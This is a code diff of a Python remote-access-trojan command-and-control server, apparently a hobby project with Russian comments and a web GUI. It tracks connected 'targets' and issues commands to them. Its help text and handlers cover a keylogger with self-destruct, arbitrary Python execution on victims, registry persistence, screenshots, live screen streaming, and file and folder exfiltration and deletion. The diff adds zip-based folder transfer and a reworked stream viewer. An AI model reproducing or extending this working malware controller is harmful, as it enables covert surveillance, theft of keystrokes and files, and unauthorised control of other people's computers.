@@ -4,6 +4,7 @@ import os
 
 import threading
 
+# stream
 import sys
 import cv2
 import pickle
@@ -14,6 +15,8 @@ from PIL import Image, ImageTk
 import tkinter as tk
 import time
 
+# archive
+import shutil
 
 ### Визуализация
 
@@ -22,15 +25,56 @@ import eel
 # ЭТО ДОЛЖНО БЫТЬ ВНАЧАЛЕ, ИНАЧЕ ОН НЕ ИНИЦИАЛИЗИРУЕТ ВСЕ ФУНКЦИИ
 eel.init('web')
 
-#####
+#####  GLOBAL VARIABLES
+targets = []
+ips = []
+
+SERVER_IP = '127.0.0.1'
+SERVER_PORT = 5555
+
+STOP_FLAG = False
+COUNT = 0
+
+HELP_TEXT = '''<br>
+								quit								--> Quit Session With Target<br>
+								disconnect					--> Disconnect Target for 20s<br>
+								clear								--> Clear The Screen<br>
+								get_system_info     --> Accept indo about Target machine
+								<br>
+								cd *Directory Name*	--> Change Directory On Target<br>
+								ls									--> View what is inside folder<br>
+								rename=>*OLD_NAME* | *NEW_NAME* --> change old name to new name
+								<br>
+								create_file *NAME*  --> Create file on Target<br>
+								delete_file *NAME*  --> Delete file on Target<br>
+								create_folder *NAME*--> Create folder on Target<br>
+								delete_folder *NAME*--> Delete folder on Target<br>
+								upload_folder
+								<br>
+								upload_file *NAME*	  --> Upload File To the target Machine<br>
+								upload_folder *NAME*	--> Upload Your Folder To the target Machine<br>
+								download_file *NAME*  --> Download File From target Machine<br>
+								download_folder *NAME*--> Download Folder From target Machine<br>
+								screenshot					  --> Take a screenshot<br>
+								<br>
+								keylog_start				--> Start the Keylogger<br>
+								keylog_dump					--> Print Keystrokes That The Target Inputted<br>
+								keylog_stop					--> Stop And Self Destruct Keylogger File<br>
+								<br>
+								python_exec *code()* 								--> Execute python code<br>
+								python_exec_file *NAME* 			--> Execute python file<br>
+								<br>
+								persistence *RegName* *fileName*	--> Create Persistence In The Registry (To Autoload)<br>
+						'''
+###
 
 @eel.expose
 def output_to_html(value):
-	eel.output(value)
+		eel.output(value)
 
 @eel.expose
 def output_catalog_to_html(value):
-	eel.output_catalog(value)
+		eel.output_catalog(value)
 
 class ScreenStream(tk.Tk):
 		def __init__(self):
@@ -43,6 +87,34 @@ class ScreenStream(tk.Tk):
 				self.frame.place(x=0, y=0) #.grid(row=0,column=0)
 				self.canvas=tk.Canvas(self.frame, bg='#FFFFFF', width=1280, height=720)
 				self.canvas.pack(side=tk.LEFT, expand=True, fill=tk.BOTH)
+
+		def show_stream(self, target):
+				data = b''
+				payload_size = struct.calcsize("L")
+				try:
+						while True:
+								while len(data) < payload_size:
+										data += target.recv(4096)
+								packed_msg_size = data[:payload_size]
+
+								data = data[payload_size:]
+								msg_size = struct.unpack("L", packed_msg_size)[0]
+
+								while len(data) < msg_size:
+										data += target.recv(4096)
+								frame_data = data[:msg_size]
+								data = data[msg_size:]
+
+								frame=pickle.loads(frame_data)
+								#print(frame.size)
+
+								img = Image.fromarray(frame)#.resize((1280, 720))
+								imgtk = ImageTk.PhotoImage(image=img)
+
+								self.canvas.create_image(0, 0, anchor='nw',image=imgtk)
+								self.frame.update()
+				except:
+						return True
 
 # Принимаем
 def reliable_recv(target):
@@ -62,16 +134,31 @@ def reliable_send(target, data):
 		target.send(jsondata.encode()) # В python3 - нужен encode
 
 # Загрузить файл на комп назначения
-def upload_file(target, file_name):
-		# Файл бинарный, поэтому нужно исп rb
-		f = open(file_name, 'rb')
-		target.send(f.read())
-		#f.close()
+def upload(target, name):
+    # Файл бинарный, поэтому нужно исп rb
+		if (os.path.isdir(name)):
+				shutil.make_archive('archive_' + name, 'zip', name)
+				f = open('archive_' + name + '.zip', 'rb')
+				target.send(f.read())
+				f.close()
+				os.remove('archive_' + name + '.zip')
+		else:
+				f = open(name, 'rb')
+				target.send(f.read())
+				f.close()
 		eel.alert_message('Файл успешно загружен')
 
-def download_file(target, file_name):
-		# Файл бинарный, поэтому нужно исп wb 
-		f = open('download/' + file_name, 'wb')
+def download(target, object_type, name):
+		global COUNT
+		# Файл бинарный, поэтому нужно исп wb
+		if (object_type == 'file'):
+				f = open('download/' + name, 'wb')
+		elif (object_type == 'folder'):
+				f = open('download/' + name + '.zip', 'wb')
+		elif (object_type == 'screenshot'):
+				f = open('download/screenshot_%d.png' % (name), 'wb')
+				target.settimeout(2)
+				COUNT += 1
 		# Чтобы обнаржуить окончание загрузки файла
 		# выставляем таймаут
 		# Если файл закочится, цикл завершится
@@ -86,26 +173,7 @@ def download_file(target, file_name):
 		# Выставялем timeout=None, чтобы не было пролем с другими функциями
 		target.settimeout(None)
 		f.close()
-		eel.alert_message('Файл успешно загружен, \
-												если с ним есть какие-то проблемы (нечитаемые буквы), \
-												попробуйте изменить его кодировку')
-
-
-# Сделать скриншот все равно, что загрузить картинку с другого компьютера
-def screenshot(target, num):
-		f = open('download/screenshot_%d.png' % (num), 'wb')
-		# На запас, чтобы сделать фото
-		target.settimeout(3)
-		chunk = target.recv(1024)
-		while chunk:
-				f.write(chunk)
-				try:
-						chunk = target.recv(1024)
-				except socket.timeout as e:
-						break
-		# Выставялем timeout=None, чтобы не было пролем с другими функциями
-		target.settimeout(None)
-		f.close()
+		eel.alert_message('Файл успешно загружен c удаленного устройства, если с ним есть какие-то проблемы (нечитаемые буквы), попробуйте изменить его кодировку')
 
 def end_session(target, num):
 		global targets
@@ -115,145 +183,82 @@ def end_session(target, num):
 		eel.delete_node(num)
 
 def open_stream(target):
-		#target, ip = s.accept()
-		#target, ip = sock.accept()
-	 
-		data = b''
-		payload_size = struct.calcsize("L")
-		 
-		while True:
-				while len(data) < payload_size:
-						data += target.recv(4096)
-				packed_msg_size = data[:payload_size]
-		 
-				data = data[payload_size:]
-				msg_size = struct.unpack("L", packed_msg_size)[0]
-		 
-				while len(data) < msg_size:
-						data += target.recv(4096)
-				frame_data = data[:msg_size]
-				data = data[msg_size:]
+		try:
+				screen_stream = ScreenStream()
+				value = screen_stream.show_stream(target)
+				return True
+		except:
+				output_to_html('Unexpecting stream error')
+				return False
 
-				frame=pickle.loads(frame_data)
-				print(frame.size)
-				frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-				cv2.imshow('Stream', frame)
-				cv2.waitKey(10)
+def get_name(command):
+		if (command[:12] == 'upload_file '):
+				return command[12:]
+		elif(command[:14] == 'upload_folder '): 
+				return command[14:]
+		elif(command[:14] == 'download_file '):
+				return command[14:]
+		elif(command[:16] == 'download_folder '):
+				return command[16:]
+		elif(command == 'screenshot'):
+				return COUNT
 
-# НЕЛЬЗЯ выйти из стрима
-def open_stream2(target):
-	data = b''
-	payload_size = struct.calcsize("L")
-
-	screen_stream = ScreenStream()
-
-	while True:
-			while len(data) < payload_size:
-					data += target.recv(4096)
-			packed_msg_size = data[:payload_size]
-
-			data = data[payload_size:]
-			msg_size = struct.unpack("L", packed_msg_size)[0]
-
-			while len(data) < msg_size:
-					data += target.recv(4096)
-			frame_data = data[:msg_size]
-			data = data[msg_size:]
-
-			frame=pickle.loads(frame_data)
-			print(frame.size)
-
-			img = Image.fromarray(frame)#.resize((1280, 720))
-			imgtk = ImageTk.PhotoImage(image=img)
-
-			screen_stream.canvas.create_image(0, 0, anchor='nw',image=imgtk)
-			screen_stream.frame.update()
-			#time.sleep(0.01)
-			#cv2.imshow('Stream', frame)
-			#cv2.waitKey(10)
+def get_command(command):
+		if(command[:14] == 'download_file '):
+				return 'file'
+		elif(command[:16] == 'download_folder '):
+				return 'folder'
+		elif(command == 'screenshot'):
+				return 'screenshot'
 
 # Принимаем данные от клента
 # Присоединиться к удаленной сессии
-count = 0
 @eel.expose
 def solo_command(session_num, command):
-#def target_communication(target):
-		global count
+		global COUNT
 		global targets
 		try:
 				num = int(session_num)
 				target = targets[num]
-
+					
 				reliable_send(target, command)
-				# Закрываем программу, если команда quit
+
 				if command == 'quit':
 						end_session(target, num)
 				elif command == 'disconnect':
 						end_session(target, num)
-				elif command[:3] == 'cd ':
-					#.split(',')
+				elif command[:3] == 'cd ' or \
+						 command[:2] == 'ls':
 						result = reliable_recv(target)
 						output_catalog_to_html(result)
-				elif command[:2] == 'ls':
+				elif command[:12] == 'create_file ' or \
+						 command[:12] == 'delete_file ' or \
+						 command[:14] == 'create_folder ' or \
+						 command[:14] == 'delete_folder ' or \
+						 command[:8] == 'rename=>':
 						result = reliable_recv(target)
 						output_catalog_to_html(result)
-				elif command[:12] == 'create_file ':
-						result = reliable_recv(target)
-						output_catalog_to_html(result)
-				elif command[:12] == 'delete_file ':
-						result = reliable_recv(target)
-						output_catalog_to_html(result)
-				elif command[:14] == 'create_folder ':
-						result = reliable_recv(target)
-						output_catalog_to_html(result)
-				elif command[:14] == 'delete_folder ':
-						result = reliable_recv(target)
-						output_catalog_to_html(result)
-				elif command[:7] == 'upload ':
-						upload_file(target, command[7:])
-				elif command[:9] == 'download ':
-						download_file(target, command[9:])
-				elif command == 'screenshot':
-						screenshot(target, count)
-						count += 1
+				elif command[:14] == 'upload_folder ' or \
+						 command[:12] == 'upload_file ':
+						upload(target, get_name(command))
+				elif command[:14] == 'download_file ' or \
+						 command[:16] == 'download_folder ' or \
+						 command == 'screenshot':
+						download(target, get_command(command), get_name(command))
 				elif command[:13] == 'screen_stream':
-						open_stream2(target)
+						open_stream(target);
+						print('was Status. Target reconnecting')
+						reliable_send(target, 'reconnect')
+						end_session(target, num)
 				elif command[:15] == 'get_system_info':
 						result = reliable_recv(target).split(',')
 						print_list_to_html(result)
-				elif command[:12] == 'python_exec ':
-						result = reliable_recv(target)
-						output_to_html(result)
-				elif command[:17] == 'python_exec_file ':
+				elif command[:12] == 'python_exec ' or \
+						 command[:17] == 'python_exec_file ':
 						result = reliable_recv(target)
 						output_to_html(result)
 				elif command == 'help':
-						output_to_html('''<br>
-							quit								--> Quit Session With Target<br>
-							disconnect					--> Disconnect Target for 20s<br>
-							clear								--> Clear The Screen<br>
-							<br>
-							cd *Directory Name*	--> Change Directory On Target<br>
-							ls									--> View what is inside folder<br>
-							<br>
-							create_file *NAME*  --> Create file on Target<br>
-							delete_file *NAME*  --> Delete file on Target<br>
-							create_folder *NAME*--> Create folder on Target<br>
-							delete_folder *NAME*--> Delete folder on Target<br>
-							<br>
-							upload *file name*	--> Upload File To the target Machine<br>
-							download *file name*--> Download File From target Machine<br>
-							screenshot					--> Take a screenshot<br>
-							<br>
-							keylog_start				--> Start the Keylogger<br>
-							keylog_dump					--> Print Keystrokes That The Target Inputted<br>
-							keylog_stop					--> Stop And Self Destruct Keylogger File<br>
-							<br>
-							python_exec *code* 								--> Execute python code<br>
-							python_exec_file *fileName* 			--> Execute python file<br>
-							<br>
-							persistence *RegName* *fileName*	--> Create Persistence In The Registry (To Autoload)<br>
-						''')
+						output_to_html(HELP_TEXT)
 				else:
 						result = reliable_recv(target)
 						output_to_html(result)
@@ -272,7 +277,7 @@ def accept_conections():
 		global targets
 		global ips
 		while True:
-				if stop_flag:
+				if STOP_FLAG:
 						break
 				sock.settimeout(1)
 				try:
@@ -284,18 +289,13 @@ def accept_conections():
 						add_tareget_to_html(len(targets)-1, ip)
 				except:
 					pass
-# Связываем сокет
-targets = []
-ips = []
-stop_flag = False
-port = 5555
 
+# Связываем сокет
 # IPv4 - socket.AF_INET
 # TCP  - socket.SOCK_STREAM
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('127.0.0.1', port))
-# Ограничение на 5 узлов
-sock.listen(5)
+sock.bind((SERVER_IP, SERVER_PORT))
+sock.listen(5) # Ограничение на 5 узлов
 t1 = threading.Thread(target=accept_conections)
 t1.start()
 print('[+] Waiting For The Incoming Connections')
@@ -304,7 +304,7 @@ output_to_html('[+] Waiting For The Incoming Connections')
 @eel.expose
 def common_command(command):
 		global targets
-		global stop_flag
+		global STOP_FLAG
 		# Список удаленных компьютеров
 		if command == 'targets':
 				counter = 0
@@ -321,7 +321,7 @@ def common_command(command):
 				# Закрывает свой сокет
 				sock.close()
 				# Устанавливаем флаг, что прервет accept_connections
-				stop_flag = True
+				STOP_FLAG = True
 				t1.join()
 				quit()
 		elif command[:8] == 'sendall ':
